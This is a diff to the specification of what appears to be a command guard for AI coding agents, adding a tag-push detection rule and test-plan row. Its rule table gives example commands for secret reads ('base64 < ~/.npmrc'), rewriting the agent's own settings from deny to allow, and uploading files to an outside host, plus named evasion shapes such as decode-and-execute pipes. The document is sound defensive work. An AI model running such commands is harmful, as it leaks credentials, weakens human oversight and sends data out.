@@ -94,6 +94,7 @@ removes its row.
 | TP-2273 | remaining git push shapes: `send-pack`, decode-and-execute pipes, globbed verbs, `-c` aliases |
 | TP-2274 | further push families: persisted or environment git aliases, config-driven refspecs, globbed command words, decode-and-execute outside a pipe |
 | TP-1517 | an unknown push destination does not fail closed |
+| TP-4177 | a tag only the remote holds, a reftable repository, and push config from a file or `--config-env` are not read as a tag push |
 | TP-1621 | host-only egress forms and a bare run-time command word are not read |
 | TP-1630 | text piped into `mksh`, `ash`, `yash` and `fish`, and `sh` at a NUL byte, is not classified |
 | TP-1631 | a push assembled from NUL-separated `xargs` input is not classified |
@@ -178,7 +179,7 @@ Every id has a test fixture.
 | secret | `secret-read` | `read.secret`, `read.secret-symlink`, `grep.secret`, and 22 `bash.secret.*` ids: `cat`, `head-tail-less`, `grep`, `cp-mv`, `encode`, `redirect-in`, `here-string`, `subshell`, `absolute`, `home-relative`, `symlink`, `link-then-read`, `var-indirection`, `quoting`, `glob`, `sh-c`, `xargs`, `inline-interpreter`, `heredoc-shell`, `script-by-path`, `keychain`, `mention` | `base64 < ~/.npmrc` |
 | config | `authority-config` | `write.config`, and `bash.config.*`: `redirect-out`, `tee`, `cp-mv-ln`, `in-place`, `remove`, `interpreter`, `git-hooks`, `git-config-hookspath`, `claude-cli`, `gh-api-ruleset`, `curl-api-ruleset`, `mention` | `sed -i '' 's/deny/allow/' ~/.claude/settings.json` |
 | merge | `merge` | `bash.merge.*`: `gh-pr-merge`, `gh-api-merge`, `gh-api-merges`, `gh-api-graphql`, `curl-api`, `git-merge-protected`, `git-push-protected`, `git-push-implicit`, `git-push-all` | `gh pr merge 12 --squash` |
-| release | `release` | `bash.release.*`: `npm-publish`, `pnpm-publish`, `yarn-bun-publish`, `changeset-publish`, `npm-registry-mutation`, `gh-release`, `gh-workflow-run`, `wrangler-deploy`, `version-packages-merge`, `git-push-tag` | `pnpm exec changeset publish` |
+| release | `release` | `bash.release.*`: `npm-publish`, `pnpm-publish`, `yarn-bun-publish`, `changeset-publish`, `npm-registry-mutation`, `gh-release`, `gh-workflow-run`, `wrangler-deploy`, `version-packages-merge`, `git-push-tag`, `git-push-maybe-tag` | `pnpm exec changeset publish` |
 | egress | `private-egress` | `bash.egress.*`: `gh-gist`, `curl-upload`, `wget-upload`, `httpie`, `raw-socket`, `remote-copy`, `cloud-copy`, `git-push-url` | `curl -d @report.json https://collect.example.com/in` |
 
 The guarded paths are `GUARDED_PATHS` (owner decision D4). The egress allowlist is GitHub,
